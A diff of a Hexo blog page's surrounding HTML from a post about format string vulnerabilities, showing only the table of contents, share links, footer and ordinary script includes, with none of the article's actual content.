-    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
-</div>
-
-            
-        
-        <div class="post-footer">
-            
-	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/漏洞挖掘/">漏洞挖掘</a></li></ul>
-
-            <div class="page-share-wrap">
-    
-
-<div class="page-share" id="pageShare">
-    <ul class="reset share-icons">
-      
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=《格式化字符串漏洞小解》 — Peterpan's Blog&pic=http://yoursite.com/img/miao_icon.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=《格式化字符串漏洞小解》 — Peterpan's Blog&source=漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      
-    </ul>
- </div>
-
-
-
-    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
-        <i class="icon icon-share-alt icon-lg"></i>
-    </a>
-</div>
-
-        </div>
-        
-            
-    <div id="comment"></div>
-
-
-        
-    </div>
-    
-<nav class="post-nav flex-row flex-justify-between">
-  
-    <div class="waves-block waves-effect prev">
-      <a href="/2018/06/05/在High-Serria上编译XNU内核/" id="post-prev" class="post-nav-link">
-        <div class="tips"><i class="icon icon-angle-left icon-lg icon-pr"></i> Prev</div>
-        <h4 class="title">在High Serria上编译XNU内核</h4>
-      </a>
-    </div>
-  
-
-  
-    <div class="waves-block waves-effect next">
-      <a href="/2018/05/13/iOS上的ROP利用/" id="post-next" class="post-nav-link">
-        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
-        <h4 class="title">iOS上的ROP利用</h4>
-      </a>
-    </div>
-  
-</nav>
-
-
+  </div>
 </article>
 
-    <div id="reward" class="page-modal reward-lay">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <h3 class="reward-title">
-        <i class="icon icon-quote-left"></i>
-        我们一起来让这个世界有趣一点
-        <i class="icon icon-quote-right"></i>
-    </h3>
-    <div class="reward-content">
+
+
+      </div>
+      
+       <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
         
-        <div class="reward-code">
-            <img id="rewardCode" src="/img/wc.png" alt="打赏二维码">
-        </div>
-        
-        <label class="reward-toggle">
-            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
-                data-wechat="/img/wc.png" data-alipay="/img/123.png">
-            <div class="reward-toggle-ctrol">
-                <span class="reward-toggle-item wechat">微信</span>
-                <span class="reward-toggle-label"></span>
-                <span class="reward-toggle-item alipay">支付宝</span>
-            </div>
-        </label>
-        
+      </ul>
     </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-介绍"><span class="toc-number">1.</span> <span class="toc-text">0x00.介绍</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-漏洞利用"><span class="toc-number">2.</span> <span class="toc-text">0x01.漏洞利用</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#泄露栈内存"><span class="toc-number">2.1.</span> <span class="toc-text">泄露栈内存</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#获取栈变量数值"><span class="toc-number">2.1.1.</span> <span class="toc-text">获取栈变量数值</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#获取栈变量对应的字符串"><span class="toc-number">2.1.2.</span> <span class="toc-text">获取栈变量对应的字符串</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#泄漏任意地址内存"><span class="toc-number">2.2.</span> <span class="toc-text">泄漏任意地址内存</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#补充"><span class="toc-number">3.</span> <span class="toc-text">补充</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/"><i class="fa fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&text=格式化字符串漏洞小解"><i class="fa fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&is_video=false&description=格式化字符串漏洞小解"><i class="fa fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=格式化字符串漏洞小解&body=Check out this article: http://yoursite.com/2018/05/30/格式化字符串漏洞小解/"><i class="fa fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=格式化字符串漏洞小解"><i class="fa fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&name=格式化字符串漏洞小解&description=&lt;p&gt;漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张&lt;/p&gt;"><i class="fa fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+      <ul>
+        <li id="toc"><a class="icon" href="#" onclick='$("#toc-footer").toggle();return false;'><i class="fa fa-list fa-lg" aria-hidden="true"></i> TOC</a></li>
+        <li id="share"><a class="icon" href="#" onclick='$("#share-footer").toggle();return false;'><i class="fa fa-share-alt fa-lg" aria-hidden="true"></i> Share</a></li>
+        <li id="top" style="display:none"><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a></li>
+        <li id="menu"><a class="icon" href="#" onclick='$("#nav-footer").toggle();return false;'><i class="fa fa-bars fa-lg" aria-hidden="true"></i> Menu</a></li>
+      </ul>
+    </div>
+
+  </div>
 </div>
 
-    
-
-</div>
-
-    <aside class="post-widget">
-        <nav class="post-toc-wrap" id="post-toc">
-            <h4>TOC</h4>
-            <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x00介绍"><span class="post-toc-number">1.</span> <span class="post-toc-text"> 0x00.介绍</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#0x01漏洞利用"><span class="post-toc-number">2.</span> <span class="post-toc-text"> 0x01.漏洞利用</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#泄露栈内存"><span class="post-toc-number">2.1.</span> <span class="post-toc-text"> 泄露栈内存</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#获取栈变量数值"><span class="post-toc-number">2.1.1.</span> <span class="post-toc-text"> 获取栈变量数值</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#获取栈变量对应的字符串"><span class="post-toc-number">2.1.2.</span> <span class="post-toc-text"> 获取栈变量对应的字符串</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#泄漏任意地址内存"><span class="post-toc-number">2.2.</span> <span class="post-toc-text"> 泄漏任意地址内存</span></a></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#补充"><span class="post-toc-number">3.</span> <span class="post-toc-text"> 补充</span></a></li></ol>
-        </nav>
-    </aside>
-    
-        <footer class="footer">
-    
-    <div class="top">
+      
+      <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy; 2018 Peter pan
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+         
+          <li><a href="/home/">Home</a></li>
+         
+          <li><a href="/about/">About</a></li>
+         
+          <li><a href="/archives/">Writing</a></li>
+         
+          <li><a href="https://github.com/Peterpan0927">Github</a></li>
         
-        
-            <p>
-    <span>Links：</span>
-    
-    <span class="blogroll-item">
-        <a href="https://www.github.com/Peterpan0927" target="_blank">github</a>
-    </span>
-    
-    <span class="blogroll-item">
-        <a href="https://bbs.iosre.com" target="_blank">iOSRE</a>
-    </span>
-    
-    <span class="blogroll-item">
-        <a href="https://www.coding.net" target="_blank">coding</a>
-    </span>
-    
-</p>
-
-        
-    </div>
-    
-    <div class="bottom">
-        <p>
-            <span>
-                Peter pan &copy; 2017 - 2018
-            </span>
-        		
-           	
-            
-            
-            <span>
-	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
-            </span>
-            
-            
-            
-        </p>
-    </div>
+      </ul>
+    </nav>
+  </div>
 </footer>
 
-    </main>
-    <div class="mask" id="mask"></div>
-<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+      <script src="/lib/justified-gallery/jquery.justifiedGallery.min.js"></script>
+<script src="/js/main.js"></script>
+<!-- Google Analytics -->
+
+<!-- Disqus Comments -->
 
 
-
-<div class="global-share" id="globalShare">
-    <ul class="reset share-icons">
-      
-      <li>
-        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=《格式化字符串漏洞小解》 — Peterpan's Blog&pic=http://yoursite.com/img/miao_icon.jpg" data-title="微博">
-          <i class="icon icon-weibo"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
-          <i class="icon icon-weixin"></i>
-        </a>
-      </li>
-      
-      <li>
-        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://yoursite.com/2018/05/30/格式化字符串漏洞小解/&title=《格式化字符串漏洞小解》 — Peterpan's Blog&source=漏洞挖掘知识填坑和MOXil学习同步进行ing…附赠好图一张" data-title=" QQ">
-          <i class="icon icon-qq"></i>
-        </a>
-      </li>
-      
-    </ul>
- </div>
-
-
-<div class="page-modal wx-share" id="wxShare">
-    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
-    <p>扫一扫，分享到微信</p>
-    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACLUlEQVR42u3a0W7CMAwF0P3/T7NXJLZyb9xNIjl5mqCUnE4ytuOvr3g9ntbzK9fvvq7frr9+/baFgYHxsYzH5Uq29Xq35FuSd5O9YWBgnMO43lB764R6/dl8bxgYGBjX1yTgHICBgYHxFwE3CcFtKomBgYExKWLzZlkerJOm3s21OAYGxgcy8i/4/7//5HwDAwPjoxiPcrVtuLUCuN4VBgbG1ow8wOUJWZsIrgVcDAyMcxh5sZq3zOYhu358GBgYWzOS9lk7HpHUmG0LLwrKGBgYWzPadn8yBDZJN/MQX/9PMDAwtmBMytH8uDFPFvOmHgYGxt6MyThXG6AnBW2RFGJgYGzEWGt75ceWSWmaBOI398HAwNiaMflwUrjm4bsd3XiTGmJgYGzEWGt1tdQ2GW2DPgYGxt6MtnG/hswrzTyVxMDAOJkxada3BWqy0XrYAgMDYzvGXaEzf05teI3YGBgYWzOSL6szynhDbTNu9OuBgYGxBaMtVttCdF7iFpMjGBgY2zHyg8M8BOehdhLofz3lwMDA2Joxadyvdfjywa83PwMYGBjHMCY3bY8H5oUxBgbGCYxHudqgnA+HJdToCBMDA2M7Rhvm1pLC/HGstd4wMDBOYLSD73eVspOAi4GBcSZj7ZCyaNyPxyyKWhwDA+N4xr1jE5P4iYGBgTE5hmyL27aE/uGzGBgYBzCSTbTFbTtkll+DgYFxGmNUOpZXJo8pOTBYPPHAwMD4PMY3qUZLqSVZhy8AAAAASUVORK5CYII=" alt="微信分享二维码">
-</div>
-
-
-    
-    <!-- main-js -->
-<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.0.0/jquery.min.js"></script>
-<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.0.7"></script>
-
-<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
-
-<script type="text/javascript" src="/js/method.js?v=1.0.7"></script>
-<script type="text/javascript" src="/js/blog.js?v=1.0.7"></script>
-
-<!-- third-party -->
-
-
-
-<script type="text/javascript" src="/js/plugins/local_search.js?v=1.0.7"></script>
-<script type="text/javascript">
-	var search_path = "search.xml";
-	if (search_path.length === 0) {
-		search_path = "search.xml";
-	}
-	var path = "/" + search_path;
-	searchFunc(path, "local-search-input", "local-search-result");
-</script>
-
-
-
-    
-        <script type="text/javascript" src="https://cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
-<script type="text/javascript" src="//unpkg.com/valine/dist/Valine.min.js"></script>
-<script type="text/javascript" src="/js/plugins/valine.js?v=1.0.7"></script>
-    
-
-
-
-<script type="text/javascript" src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.4.js"></script>
-<script type="text/javascript" src="/js/plugins/leancloud_visitors.js?v=1.0.7"></script>
-
-
-
-    <!-- mathjax config similar to math.stackexchange -->
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Config({
-        tex2jax: {
-            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
-            processEscapes: true,
-            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
-        }
-    });
-</script>
-
-<script type="text/x-mathjax-config">
-    MathJax.Hub.Queue(function() {
-        var all = MathJax.Hub.getAllJax(), i;
-        for (i=0; i < all.length; i += 1) {
-            all[i].SourceElement().parentNode.className += ' has-jax';
-        }
-    });
-</script>
-
-<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
-
-
-
-
-    <script>
-    (function() {
-        var OriginTitile = document.title, titleTime;
-        document.addEventListener('visibilitychange', function() {
-            if (document.hidden) {
-                document.title = '思维失去连接...';
-                clearTimeout(titleTime);
-            } else {
-                document.title = '(つェ⊂)咦!又好了!';
-                titleTime = setTimeout(function() {
-                    document.title = OriginTitile;
-                },2000);
-            }
-        });
-    })();
-</script>
-
-
-    
+    </div>
 </body>
 </html>
